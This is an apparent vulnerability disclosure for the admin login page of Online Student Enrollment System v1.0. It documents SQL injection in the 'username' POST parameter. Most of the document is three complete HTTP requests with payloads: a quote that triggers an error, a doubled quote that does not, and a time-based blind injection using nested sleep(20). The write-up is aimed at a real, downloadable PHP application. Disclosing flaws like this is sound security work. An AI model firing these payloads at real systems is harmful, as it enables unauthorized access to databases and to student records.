# Online Student Enrollment System v1.0 by donbermoy has SQL injection

BUG_Author:XueYing Li

vendors:https://www.sourcecodester.com/php/14281/online-student-enrollment-system-using-phpmysqli.html

Vulnerability File: /student_enrollment/admin/login.php

Parameter "username" (POST), exists SQL injection vulnerability

Payload1:username=1%27&password=2&login=

```
POST /student_enrollment/admin/login.php HTTP/1.1
Host: localhost
Content-Length: 31
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/student_enrollment/admin/login.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=bi7132qp84261ga80u4umo124d
Connection: close

username=1%27&password=2&login=
```

An error page

![image](https://github.com/snowingllll/pic/blob/main/error.png)

Payload2:username=1%27%27&password=2&login=

```
POST /student_enrollment/admin/login.php HTTP/1.1
Host: localhost
Content-Length: 34
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/student_enrollment/admin/login.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=bi7132qp84261ga80u4umo124d
Connection: close

username=1%27%27&password=2&login=
```

An right page

![image](https://github.com/snowingllll/pic/blob/main/right.png)

Payload3:username=a'%2b(select*from(select(sleep(20)))a)%2b'&password=b&login=

```
POST /student_enrollment/admin/login.php HTTP/1.1
Host: localhost
Origin: http://localhost
Cookie: PHPSESSID=argh74f67q09vjd4k7088q9sji
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Upgrade-Insecure-Requests: 1
Referer: http://localhost/student_enrollment/admin/login.php
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en-GB;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Cache-Control: max-age=0
Content-Length: 69

username=a'%2b(select*from(select(sleep(20)))a)%2b'&password=b&login=
```

sleep(20) The server response time is 20 seconds

![image](https://github.com/snowingllll/pic/blob/main/twenty.png)
